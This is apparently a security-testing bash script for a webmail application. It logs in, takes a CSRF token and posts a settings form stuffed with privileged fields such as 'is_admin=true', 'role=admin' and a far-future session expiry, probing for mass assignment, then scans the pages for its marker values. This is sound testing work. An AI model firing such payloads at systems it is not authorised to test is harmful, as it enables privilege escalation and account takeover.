#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed python3
setup_run_dir "40-mass-assignment-settings"

perform_login cookies.txt login.headers login.body.html
fetch_get "${SETTINGS_PATH}" settings-pre.html settings-pre.headers cookies.txt
csrf="$(extract_first_csrf settings-pre.html)"
fetch_post_form "${SETTINGS_PATH}" mass-post.html mass-post.headers cookies.txt "${SETTINGS_PATH}" \
  --data-urlencode "csrf_token=${csrf}" \
  --data-urlencode 'html_display_preference=prefer_sanitized_html' \
  --data-urlencode "archive_mailbox_name=${DEFAULT_ARCHIVE_MAILBOX}" \
  --data-urlencode 'is_admin=true' \
  --data-urlencode 'role=admin' \
  --data-urlencode 'user_id=1' \
  --data-urlencode 'account_id=1' \
  --data-urlencode 'status=active' \
  --data-urlencode 'session_id=WSTG_MASS_1' \
  --data-urlencode 'revoked_at=9999999999' \
  --data-urlencode 'expires_at=9999999999' \
  --data-urlencode 'ip_address=127.0.0.1' \
  --data-urlencode 'user_agent=WSTG_MASS_AGENT'
fetch_get "${SETTINGS_PATH}" settings-after.html settings-after.headers cookies.txt
fetch_get "${SESSIONS_PATH}" sessions-after.html sessions-after.headers cookies.txt
fetch_get "${MESSAGE_VIEW_PATH}?mailbox=${DEFAULT_MAILBOX}&uid=${DEFAULT_MESSAGE_UID}" mailbox-after.html mailbox-after.headers cookies.txt

printf '===== mass-post.headers =====\n'
sed -n '1,80p' mass-post.headers
printf '\n===== suspicious token scan =====\n'
python3 - <<'PY'
from pathlib import Path
tokens = ["WSTG_MASS_1", "WSTG_MASS_AGENT", "admin", "127.0.0.1", "9999999999"]
for name in ["settings-after.html", "sessions-after.html", "mailbox-after.html"]:
    html = Path(name).read_text(errors="ignore")
    print(f"\n--- file: {name} ---")
    found = False
    for token in tokens:
        if token in html:
            found = True
            pos = html.find(token)
            start = max(0, pos - 160)
            end = min(len(html), pos + 220)
            print(html[start:end])
    if not found:
        print("no suspicious tokens found")
PY

printf '\nSaved in %s\n' "$RUN_DIR"
